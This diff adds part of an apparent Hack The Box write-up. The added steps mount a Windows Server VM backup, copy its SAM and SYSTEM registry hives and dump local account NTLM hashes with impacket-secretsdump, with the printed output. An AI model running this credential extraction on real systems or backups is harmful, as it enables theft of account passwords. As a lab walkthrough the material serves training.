@@ -1303,4 +1303,71 @@ getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019.vmxf
 ```
 
 
+``` bash
+
+❯ tree NightlyBackup_2024-11-01
+NightlyBackup_2024-11-01
+└── memory forensics
+    ├── Windows Server 2019-000001.vmdk
+    ├── Windows Server 2019.nvram
+    ├── Windows Server 2019.scoreboard
+    ├── Windows Server 2019-Snapshot1.vmem
+    ├── Windows Server 2019-Snapshot1.vmsn
+    ├── Windows Server 2019.vmdk
+    ├── Windows Server 2019.vmsd
+    ├── Windows Server 2019.vmx
+    └── Windows Server 2019.vmxf
+
+2 directories, 9 files
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
+╰─                                                                                                               ─╯
+
+```
+
+
+``` bash
+
+❯ cd "NightlyBackup_2024-11-01/memory forensics"
+
+❯ sudo mkdir /mnt/vmdk
+
+❯ sudo guestmount -a "Windows Server 2019.vmdk" -a "Windows Server 2019-000001.vmdk" -i --ro /mnt/vmdk
+╭─ ~/h/ctf/htb/medium/checkpoint/scripts/NightlyBackup_2024-11-01/memory forensics                       ✔ │ 50s ─╮
+╰─                                                                                                               ─╯
+
+```
+
+
+``` bash
+
+❯ sudo impacket-secretsdump -sam /mnt/vmdk/Windows/System32/config/SAM -system /mnt/vmdk/Windows/System32/config/SYSTEM LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[-] [Errno 30] Read-only file system: '/mnt/vmdk/Windows/System32/config/SYSTEM'
+[*] Cleaning up...
+❯ sudo cp /mnt/vmdk/Windows/System32/config/SAM /tmp/SAM
+
+❯ sudo cp /mnt/vmdk/Windows/System32/config/SYSTEM /tmp/SYSTEM
+
+❯ impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
+Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
+
+[-] [Errno 13] Permission denied: '/tmp/SYSTEM'
+[*] Cleaning up...
+❯ sudo impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:28f8d934dee90b2ec824351cb0844479:::
+[*] Cleaning up...
+╭─ ~/h/ctf/htb/medium/checkpoint/scripts/NightlyBackup_2024-11-01/memory forensics                             ✔ ─╮
+╰─                                                                                                               ─╯
+
+```
+
+
 
